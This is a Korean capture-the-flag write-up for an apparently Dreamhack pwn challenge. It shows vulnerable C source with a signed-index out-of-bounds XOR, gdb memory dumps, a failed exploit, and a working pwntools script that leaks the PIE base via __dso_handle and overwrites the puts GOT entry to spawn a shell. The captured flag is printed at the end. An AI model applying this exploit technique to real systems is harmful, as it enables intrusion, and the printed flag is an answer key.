```c
// gcc -o main main.c -Wl,-z,norelro

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

uint64_t arr[64] = {0};

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
}

void print_menu() {
    puts("1. XOR two values");
    puts("2. Print one value");
    printf("> ");
}

void xor() {
    int32_t i, j;
    printf("Enter i & j > ");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}

void print() {
    uint32_t i;
    printf("Enter i > ");
    scanf("%d", &i);
    printf("Value: %lx\n", arr[i]);
}

void win() {
    system("/bin/sh");
}

int main() {
    int option, i, j;

    initialize();
    while (1) {
        print_menu();
        scanf("%d", &option);
        if (option == 1) {
            xor();
        } else if (option == 2) {
            print();
        } else {
            break;
        }
    }

    return 0;
}
```

----
xor 함수를 통해 xor을 수행하는 코드이다 근데 xor함수 수행시 음수값도 들어간다


```c
void xor() {
    int32_t i, j;
    printf("Enter i & j > ");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}
```
그냥 int32_t로 선언되어있어 -10이런거 입력가능

----

```c
0x55f58d8a93a0:	0x000000006ffffff0	0x000055f58d8a65dc
0x55f58d8a93b0:	0x000000006ffffff9	0x0000000000000003
0x55f58d8a93c0:	0x0000000000000000	0x0000000000000000
0x55f58d8a93d0:	0x0000000000000000	0x0000000000000000
0x55f58d8a93e0:	0x0000000000000000	0x0000000000000000
0x55f58d8a93f0:	0x0000000000000000	0x0000000000000000
0x55f58d8a9400:	0x0000000000000000	0x0000000000000000
0x55f58d8a9410:	0x0000000000003220	0x0000000000000000
0x55f58d8a9420:	0x0000000000000000	0x00007fd1eca6ee50
0x55f58d8a9430 <__stack_chk_fail@got.plt>:	0x00007fd1ecb245d0	0x00007fd1eca3ed70
0x55f58d8a9440 <printf@got.plt>:	0x00007fd1eca4e6f0	0x00007fd1eca6f5f0
0x55f58d8a9450 <__isoc99_scanf@got.plt>:	0x00007fd1eca50090	0x00007fd1eca17dc0
0x55f58d8a9460:	0x0000000000000000	0x0000000000000000
0x55f58d8a9470:	0x0000000000000000	0x00007fd1eca339a0
0x55f58d8a9480:	0x0000000000000000	0x000055f58d8a9488
0x55f58d8a9490:	0x0000000000000000	0x0000000000000000
0x55f58d8a94a0 <stdout@GLIBC_2.2.5>:	0x00007fd1ecc09780	0x0000000000000000
0x55f58d8a94b0 <stdin@GLIBC_2.2.5>:	0x00007fd1ecc08aa0	0x00000000000--Type <RET> for more, q to quit, c to continue without paging--
00000
0x55f58d8a94c0 <arr>:	0x0000000000000001	0x0000000000000002
0x55f58d8a94d0 <arr+16>:	0x0000000000000004	0x0000000000000008
0x55f58d8a94e0 <arr+32>:	0x0000000000000010	0x0000000000000020
```

선언된 arr의 뒤쪽을보니 stack_chk_fail이 눈에뛴다 이부분을 덮을생각
offset = -18

그리고 code영역으로 보이는 무언가

0x000055f58d8a65dc 
offset = -35

해당 값에서 win까지의 offset은

offset = 0xe11 만큼 더해주면됨

---
payload

```c
from pwn import *

p = remote("host8.dreamhack.games",9150)

__stack_chk_fail_offset = 18

offset_x_y = 35
offset_win = 0xe11 #add

####stack check
p.sendlineafter(b"> ",b"1")
p.sendlineafter(b"Enter i & j > ",b"63 -18")

#for re in range(16):
#    p.sendlineafter(b"> ",b"1")
#    p.sendlineafter(b"Enter i & j > ",b"63 62")
##recover

p.sendlineafter(b"> ",b"2")
p.sendlineafter(b"Enter i >",b"63")

p.recvuntil(b"Value: ")

stack_check_leak = int(p.recv(16),16)
print(hex(stack_check_leak))
stcak_check_leak_12b = stack_check_leak & 0xFFFFFFFFFFFF

for new in range(48):
    if(stcak_check_leak_12b>>new)&1:
        p.sendlineafter(b"> ",b"1")
        p.sendlineafter(b"Enter i & j > ",f"-18 {new}".encode())

##### stack check to zero

p.sendlineafter(b"> ",b"1")
p.sendlineafter(b"Enter i & j > ",b"40 -35")

for re in range(16):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"Enter i & j > ",b"40 39")

#recover_done

p.sendlineafter(b"> ",b"2")
p.sendlineafter(b"Enter i >",b"40")

p.recvuntil(b"Value: ")

code_leak = int(p.recv(12),16)
win_addr = code_leak + 0xe11
code_leak_2byte = code_leak&0xFFFF

for i in range(16):
    if(code_leak_2byte>>i)&1:
        p.sendlineafter(b"> ",b"1")
        p.sendlineafter(b"Enter i & j > ",f"40 {i}".encode())

win_addr_2byte = win_addr&0xFFFF

for win in range(16):
    if(win_addr_2byte>>win)&1:
        p.sendlineafter(b"> ",b"1")
        p.sendlineafter(b"Enter i & j > ",f"40 {win}".encode())

##### stack check modift
p.sendlineafter(b"> ",b"1")
p.sendlineafter(b"Enter i & j > ",b"-18 40")

#p.sendlineafter(b"> ",b"3")

p.interactive()

#p.sendlineafter(b"> ",b"2")
#p.sendlineafter(b"Enter i >",b"40")
#p.recvuntil(b"Value: ")
#code_leak = int(p.recv(12),16)
#print(hex(code_leak))
```

안된다.. 이유는아직 모르겠음 완벽하다고생각했는데 머지..


```c
.data:0000000000003480 ; =========================================================================== 
.data:0000000000003480 
.data:0000000000003480 ; Segment type: Pure data 
.data:0000000000003480 ; Segment permissions: Read/Write 
.data:0000000000003480 _data segment qword public 'DATA' use64 
.data:0000000000003480 assume cs:_data 
.data:0000000000003480 ;org 3480h 
.data:0000000000003480 public __data_start ; weak 
.data:0000000000003480 __data_start db 0 ; Alternative name is '__data_start' 
.data:0000000000003480 ; data_start 
.data:0000000000003481 db 0 
.data:0000000000003482 db 0 
.data:0000000000003483 db 0 
.data:0000000000003484 db 0 
.data:0000000000003485 db 0 
.data:0000000000003486 db 0 
.data:0000000000003487 db 0 
.data:0000000000003488 public __dso_handle 
.data:0000000000003488 ; void *_dso_handle 
.data:0000000000003488 __dso_handle dq offset __dso_handle ; DATA XREF: __do_global_dtors_aux+1B↑r 
.data:0000000000003488 ; 
.data:__dso_handle↓o 
.data:0000000000003488 _data ends
```

```c
__dso_handle
```
C 런타임에서 atexit()로 등록된 소멸자들이 **어느 DSO 소속인지** 구분하는 용도 라고한다

```c
// 내부적으로 이렇게 동작 
__cxa_atexit(destructor, arg, __dso_handle); 
// ↑ "이 소멸자는 이 DSO 소속이야"
```
내부적으로는 이런식으로 동작하는데
dso_handle은 링커가 컴파일시 내부적으로

```c
void *__dso_handle = &__dso_handle; // 자기 자신을 가리킴
```
이렇게 정의해버린다 즉 자기자신의 주소를 해당변수가 가지고있다 그래서 이번 PIE leak에 활용된다

payload 구성

1. dso_handle leak을통한 code_base 추출
    
2. win_addr 만들기
    
3. puts got를 arr 64번쨰에 넣고 해당값과 win을 xor
    
4. puts idx와 arr 64번째를 xor (put_got ^ win 다시 ^ puts_got 하면 win만 남겠죠?)
    
5. 트리거
---

payload
```c
from pwn import *

p = remote("host8.dreamhack.games",23741)
e = ELF("./main")

def xor(i,j):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"Enter i & j > ",f"{i} {j}".encode())
    
def print_(i):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"Enter i > ",f"{i}".encode())
    p.recvuntil(b"Value: ")
    return int(p.recvline().strip(),16)

win = e.symbols["win"]
dso_handle = e.symbols["__dso_handle"]
arr = e.symbols["arr"]
puts = e.got["puts"]

dso_idx = (dso_handle - arr) // 8
puts_idx = (puts - arr) // 8

xor("65",dso_idx)

dso_st = print_("65")
code_base = dso_st - dso_handle
win += code_base

xor("64",puts_idx)


for i in range(64):
    if(win>>i)&1:
        xor("64",i)

xor(puts_idx,"64")

p.interactive()
```

done
```c
[*] Switching to interactive mode
$ ls
flag
main
$ cat flag
DH{8475338cdd6114aad8f4c04264f523c3037d245e641118e2a7afe66710f469f4}
$ 
```